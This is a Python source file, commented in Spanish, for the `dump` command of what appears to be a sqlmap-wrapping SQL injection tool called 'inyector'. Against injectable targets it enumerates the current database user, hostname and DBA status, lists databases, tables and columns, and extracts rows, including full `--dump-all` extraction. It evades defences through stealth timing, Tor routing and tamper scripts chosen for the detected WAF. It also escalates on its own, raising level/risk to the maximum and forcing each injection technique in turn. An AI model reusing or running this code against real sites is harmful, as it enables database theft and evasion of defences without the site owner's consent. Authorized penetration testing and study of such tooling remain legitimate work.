"""Comando `dump` — enumeración/extracción persistente contra un target
YA confirmado inyectable por un `scan` anterior.

No reinventa "recordar la técnica/DBMS confirmado" -- sqlmap ya cachea
eso solo en su propia sesión (`<output_dir>/<host>/session.sqlite`).
Este comando simplemente apunta al mismo `--output-dir`/URL/param/
method y NO manda `--flush-session` (ver `CommandBuilder.build`,
parámetro `flush_session`), así que si sqlmap ya confirmó la inyección
ahí antes, va directo a enumerar/extraer; si no, hace su detección
normal antes de dumpear -- más lento la primera vez, pero sigue siendo
correcto.

"Persistente" = una escalera de reintentos (`_run_dump_with_persistence`),
no un solo intento -- ver esa función para el detalle de cada escalón.

Reporte: solo estructura y conteos (bases/tablas/columnas/filas
encontradas), nunca los valores extraídos -- esos quedan en el CSV que
sqlmap ya genera por su cuenta bajo
`<output_dir>/<host>/dump/<db>/<tabla>.csv`. Decisión explícita del
usuario al diseñar esta feature.
"""

import json
import os
import time
from datetime import datetime
from urllib.parse import urlparse

import click
from rich.table import Table

from inyector.commands import common
from inyector.commands.scan import _run_recon_phase
from inyector.utils.logger import configure_logging
from inyector.utils.session_store import SessionStore
from inyector.utils.stealth import StealthEngine
from inyector.intelligence.tamper_selector import TamperSelector
from inyector.intelligence.timing_calculator import TimingCalculator
from inyector.intelligence.command_builder import CommandBuilder
from inyector.executor.sqlmap_runner import SqlmapRunner
from inyector.reporting.dump_parser import DumpOutputParser

# Orden de técnicas a forzar una por vez cuando la config por defecto
# (y luego escalada) no logra extraer nada -- aislar una sola técnica
# es un truco real de troubleshooting cuando la detección multi-técnica
# no logra activar la extracción. E/U primero (casi instantáneas si
# son viables), T/B después (más lentas pero más universales bajo
# WAFs), S al final (la menos común).
TECHNIQUE_FALLBACK_ORDER = ["E", "U", "T", "B", "S"]

# Acciones "baratas" (enumeración) vs. "caras" (extracción real de
# filas) -- determina cuánta escalera de reintentos vale la pena
# correr, ver _run_dump_with_persistence.
CHEAP_ACTIONS = {"current", "dbs", "tables", "columns", "search"}


@click.command(name="dump")
@click.option("-u", "--url", required=True, help="URL objetivo (misma que el scan que confirmó la SQLi)")
@click.option("-p", "--param", required=True, help="Parámetro ya confirmado inyectable")
@click.option("--method", default="GET", help="Método HTTP: GET o POST (default: GET)")
@click.option("--data", default=None, help="Data para POST request")
@click.option("--cookie", default=None, help="Cookies de sesión")
@click.option("--header", multiple=True, help="Headers adicionales (múltiples)")
@click.option("--csrf-field", default=None,
              help="Nombre de campo anti-CSRF/token dinámico a refrescar antes "
                   "de cada request (ver --csrf-field en `scan`).")
@click.option("--csrf-url", default=None,
              help="URL de donde releer --csrf-field (default: la misma -u/--url).")
@click.option("--technique", default=None, help="Forzar técnica SQLi (B/E/U/S/T/Q)")
@click.option("--tamper", default=None, help="Tamper scripts adicionales")
@click.option("--level", default=2, type=click.IntRange(1, 5), help="Level sqlmap 1-5 (default: 2)")
@click.option("--risk", default=1, type=click.IntRange(1, 3), help="Risk sqlmap 1-3 (default: 1)")
@click.option("--output-dir", default=None,
              help="Directorio de reportes -- DEBE ser el mismo que usó el "
                   "`scan` que confirmó la inyección, para que sqlmap pueda "
                   "resumir su sesión cacheada.")
@click.option("--stealth", is_flag=True, default=False, help="Modo sigilo máximo")
@click.option("--fast", is_flag=True, default=False, help="Sin modo sigilo")
@click.option("--proxy", default=None, help="Proxy HTTP")
@click.option("--tor", is_flag=True, default=False, help="Enrutar por Tor")
@click.option("--current", is_flag=True, default=False,
              help="Enumerar DB/usuario/hostname/DBA actuales "
                   "(--current-db --current-user --hostname --is-dba)")
@click.option("--dbs", is_flag=True, default=False, help="Enumerar bases de datos")
@click.option("-D", "--db", default=None, help="Base de datos objetivo")
@click.option("--tables", is_flag=True, default=False, help="Enumerar tablas (usar con -D)")
@click.option("-T", "--table", default=None, help="Tabla objetivo")
@click.option("--columns", is_flag=True, default=False, help="Enumerar columnas (usar con -D -T)")
@click.option("--dump", "do_dump", is_flag=True, default=False,
              help="Extraer filas de -D/-T (requiere ambos)")
@click.option("-C", "--columns-list", default=None,
              help="Columnas específicas a extraer, separadas por coma (con --dump)")
@click.option("--where", default=None, help="Condición WHERE para acotar el dump")
@click.option("--start", default=None, type=int, help="Primera fila a extraer")
@click.option("--stop", default=None, type=int, help="Última fila a extraer")
@click.option("--dump-all", "do_dump_all", is_flag=True, default=False,
              help="Extraer TODO -- alto impacto, usar con cuidado y dentro del alcance autorizado")
@click.option("--include-sysdbs", is_flag=True, default=False,
              help="Con --dump-all, incluir bases de sistema (excluidas por default)")
@click.option("--search", "search_term", default=None,
              help="Buscar bases/tablas/columnas que coincidan con este nombre "
                   "(usar junto con -D/-T/-C como patrón)")
@click.option("-v", "--verbose", is_flag=True, default=False, help="Output detallado")
def dump(url, param, method, data, cookie, header, csrf_field, csrf_url,
         technique, tamper, level, risk, output_dir, stealth, fast, proxy, tor,
         current, dbs, db, tables, table, columns, do_dump, columns_list, where,
         start, stop, do_dump_all, include_sysdbs, search_term, verbose):
    """Enumera/extrae datos de un target ya confirmado inyectable (ver `scan`)."""
    common.show_banner()
    configure_logging(verbose=verbose)

    dump_action, cheap_action = _resolve_dump_action(
        current, dbs, db, tables, table, columns, do_dump, columns_list,
        where, start, stop, do_dump_all, include_sysdbs, search_term,
    )

    output_dir = output_dir or os.environ.get("INYECTOR_REPORTS_DIR", "/app/reports")
    os.makedirs(output_dir, exist_ok=True)

    stealth_mode = True
    if fast:
        stealth_mode = False
    if stealth:
        stealth_mode = True
    if tor:
        proxy = proxy or "socks5://127.0.0.1:9050"

    common.console.print(
        "[bold #00ff88][*] Preparando dump...[/bold #00ff88]\n"
    )
    session = common.create_session(cookie=cookie, headers=list(header), proxy=proxy)

    session_store = SessionStore()
    recon_data = session_store.load(output_dir, url, param, method)
    if recon_data:
        common.console.print(
            "  [dim]→ Reusando recon guardado de un scan anterior contra "
            "este target[/dim]\n"
        )
    else:
        common.console.print(
            "  [yellow]→ Sin recon guardado para este target -- corriendo "
            "reconocimiento antes de dumpear[/yellow]\n"
        )
        stealth_engine = StealthEngine()
        recon_data = _run_recon_phase(
            url, param, method, data, None, session, stealth_mode,
            stealth_engine, False, False, common.console,
        )
        session_store.save(output_dir, url, param, method, recon_data)

    tamper_selector = TamperSelector()
    selected_tampers = tamper_selector.select(
        waf=recon_data["waf"]["waf"], orm=recon_data["orm"]["orm"],
    )
    if tamper:
        for t in [t.strip() for t in tamper.split(",")]:
            if t not in selected_tampers:
                selected_tampers.append(t)

    timing_calc = TimingCalculator(stealth_mode=stealth_mode)
    baseline = timing_calc.measure_baseline(url, session)
    timing_result = timing_calc.calculate_delay(baseline, recon_data["waf"]["waf"])

    scan_config = {
        "url": url, "param": param, "method": method, "data": data,
        "cookie": cookie, "headers": list(header),
        "waf": recon_data["waf"], "stack": recon_data["stack"],
        "orm": recon_data["orm"], "timing": timing_result,
        "tampers": selected_tampers, "technique": technique,
        "level": level, "risk": risk, "threads": 3, "proxy": proxy,
        "output_dir": output_dir, "stealth": stealth_mode,
        "csrf_token": csrf_field, "csrf_url": csrf_url, "csrf_method": "GET",
        # A propósito NO flusheamos: queremos que sqlmap resuma la
        # sesión ya confirmada por el `scan` anterior contra este mismo
        # target/output-dir en vez de re-detectar desde cero.
        "flush_session": False,
        "dump": dump_action,
    }

    common.console.print(
        f"[bold #00ff88][*] Ejecutando dump ({dump_action['action']})...[/bold #00ff88]\n"
    )

    start_time = time.time()
    parsed, attempts_log = _run_dump_with_persistence(
        scan_config, output_dir, verbose, cheap_action, common.console,
    )
    elapsed = time.time() - start_time

    _show_dump_summary(url, output_dir, dump_action, parsed, attempts_log, elapsed, common.console)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    summary_path = os.path.join(output_dir, f"dump_summary_{timestamp}.json")
    with open(summary_path, "w", encoding="utf-8") as f:
        json.dump({
            "url": url, "param": param, "action": dump_action,
            "result": parsed, "attempts": attempts_log,
        }, f, indent=2, ensure_ascii=False)
    common.console.print(f"  [green]✅ Resumen: {summary_path}[/green]\n")


def _resolve_dump_action(current, dbs, db, tables, table, columns, do_dump,
                          columns_list, where, start, stop, do_dump_all,
                          include_sysdbs, search_term):
    """Determina la acción de dump pedida por CLI (exactamente una) y
    si es una acción 'barata' (enumeración) o 'cara' (extracción real
    de filas) -- ver CHEAP_ACTIONS.

    Returns:
        Tupla (dump_config: dict, cheap_action: bool).

    Raises:
        click.UsageError: si no se pidió ninguna acción, o si a una
            acción le faltan los argumentos que necesita.
    """
    if do_dump_all:
        return (
            {"action": "dump_all", "exclude_sysdbs": not include_sysdbs},
            False,
        )
    if do_dump:
        if not (db and table):
            raise click.UsageError("--dump necesita -D/--db y -T/--table.")
        return (
            {
                "action": "dump", "db": db, "table": table,
                "columns": columns_list, "where": where,
                "start": start, "stop": stop,
            },
            False,
        )
    if columns:
        if not (db and table):
            raise click.UsageError("--columns necesita -D/--db y -T/--table.")
        return {"action": "columns", "db": db, "table": table}, True
    if tables:
        return {"action": "tables", "db": db}, True
    if dbs:
        return {"action": "dbs"}, True
    if search_term:
        return (
            {"action": "search", "db": db, "table": table, "columns": search_term},
            True,
        )
    if current:
        return {"action": "current"}, True

    raise click.UsageError(
        "Hace falta pedir al menos una acción: --current, --dbs, --tables, "
        "--columns, --dump, --dump-all o --search."
    )


def _run_dump_with_persistence(scan_config: dict, output_dir: str,
                                verbose: bool, cheap_action: bool,
                                console) -> tuple:
    """Corre sqlmap con la config dada y, si el resultado viene vacío
    sin ser un fallo de conexión real, escala automáticamente antes de
    rendirse -- el "pentester persistente" pedido: no un solo intento.

    Escalera:
    1. Config tal cual (técnica cacheada por sqlmap o la pedida por
       CLI, level/risk pedidos).
    2. Si vacío: escala level/risk al máximo
       (`common.AUTO_ESCALATE_LEVEL`/`AUTO_ESCALATE_RISK`, mismo patrón
       que `_execute_with_escalation` en scan.py).
    3. Si `cheap_action` y sigue vacío y no se forzó `--technique`:
       fuerza una técnica a la vez (`TECHNIQUE_FALLBACK_ORDER`).
    4. Se rinde -- `attempts_log` documenta cada intento para que el
       reporte final explique QUÉ se probó, nunca un "no hay datos" en
       silencio.

    Para acciones no baratas (`--dump`/`--dump-all`) solo se corre el
    escalón 2 -- forzar 5 técnicas sobre una tabla completa con
    boolean-blind puede tardar horas, y sqlmap ya prueba varias
    técnicas internamente por columna una vez que sabe cuál es
    inyectable.

    Returns:
        Tupla (parsed: dict de DumpOutputParser, attempts_log: list).
    """
    attempts_log: list[dict] = []
    runner = SqlmapRunner(verbose=verbose)
    parser = DumpOutputParser()

    def _attempt(config: dict, label: str):
        command = CommandBuilder().build(config)
        if verbose:
            console.print(f"\n  [dim]Comando ({label}): {command}[/dim]")
        result = runner.run(command, output_dir)
        parsed = parser.parse(result.get("stdout", ""))
        is_empty = not any([
            parsed["current_db"], parsed["current_user"], parsed["hostname"],
            parsed["is_dba"] is not None, parsed["databases"],
            parsed["tables"], parsed["columns"], parsed["dumps"],
        ])
        hard_failure = bool(result.get("connection_issue"))
        attempts_log.append({
            "label": label, "empty": is_empty, "hard_failure": hard_failure,
            "failure_reason": result.get("failure_reason", ""),
        })
        return parsed, is_empty, hard_failure

    parsed, is_empty, hard_failure = _attempt(scan_config, "config inicial")
    if not is_empty or hard_failure:
        return parsed, attempts_log

    console.print(
        "  [yellow]⚠️  Sin resultados -- escalando level/risk antes de "
        "rendirse...[/yellow]"
    )
    escalated = {
        **scan_config,
        "level": common.AUTO_ESCALATE_LEVEL,
        "risk": common.AUTO_ESCALATE_RISK,
    }
    parsed, is_empty, hard_failure = _attempt(escalated, "level/risk escalado")
    if not is_empty or hard_failure or not cheap_action:
        return parsed, attempts_log

    if not scan_config.get("technique"):
        for tech in TECHNIQUE_FALLBACK_ORDER:
            console.print(
                f"  [yellow]⚠️  Sin resultados -- forzando técnica "
                f"'{tech}'...[/yellow]"
            )
            forced = {**escalated, "technique": tech}
            parsed, is_empty, hard_failure = _attempt(forced, f"técnica forzada {tech}")
            if not is_empty or hard_failure:
                return parsed, attempts_log

    return parsed, attempts_log


def _show_dump_summary(url: str, output_dir: str, dump_action: dict,
                        parsed: dict, attempts_log: list,
                        elapsed_time: float, console) -> None:
    """Tabla de resumen -- solo estructura y conteos, nunca los valores
    extraídos (esos quedan en el CSV propio de sqlmap)."""
    table = Table(
        title="RESUMEN DEL DUMP", title_style="bold #00ff88",
        border_style="#00ff88", show_header=False, padding=(0, 2),
    )
    table.add_column("Campo", style="bold", width=20)
    table.add_column("Valor", width=55)

    hostname = urlparse(url).hostname or url
    table.add_row("Target", hostname)
    table.add_row("Acción", dump_action["action"])
    table.add_row("Intentos", str(len(attempts_log)))

    if parsed["current_db"]:
        table.add_row("DB actual", parsed["current_db"])
    if parsed["current_user"]:
        table.add_row("Usuario actual", parsed["current_user"])
    if parsed["hostname"]:
        table.add_row("Hostname DB", parsed["hostname"])
    if parsed["is_dba"] is not None:
        table.add_row("Es DBA", "sí" if parsed["is_dba"] else "no")
    if parsed["databases"]:
        table.add_row("Bases encontradas", ", ".join(parsed["databases"][:10]))
    for db_name, tbls in parsed["tables"].items():
        table.add_row(f"Tablas ({db_name})", ", ".join(tbls[:10]))
    for key, cols in parsed["columns"].items():
        col_names = ", ".join(c["name"] for c in cols[:10])
        table.add_row(f"Columnas ({key})", col_names)
    for d in parsed["dumps"]:
        table.add_row(
            f"Filas ({d['db']}.{d['table']})",
            f"{d['row_count']} fila(s), columnas: {', '.join(d['columns'])}",
        )
        dump_csv_hint = os.path.join(
            output_dir, urlparse(url).hostname or "target", "dump",
            d["db"], f"{d['table']}.csv",
        )
        table.add_row("Datos reales en", dump_csv_hint)

    is_empty = not any([
        parsed["current_db"], parsed["current_user"], parsed["hostname"],
        parsed["is_dba"] is not None, parsed["databases"],
        parsed["tables"], parsed["columns"], parsed["dumps"],
    ])
    if is_empty:
        tried = ", ".join(a["label"] for a in attempts_log)
        table.add_row(
            "Resultado",
            f"[bold red]sin datos tras {len(attempts_log)} intento(s): "
            f"{tried}[/bold red]",
        )

    minutes = int(elapsed_time // 60)
    seconds = int(elapsed_time % 60)
    table.add_row("Duración", f"{minutes}m {seconds}s")

    console.print()
    console.print(table)
    console.print()
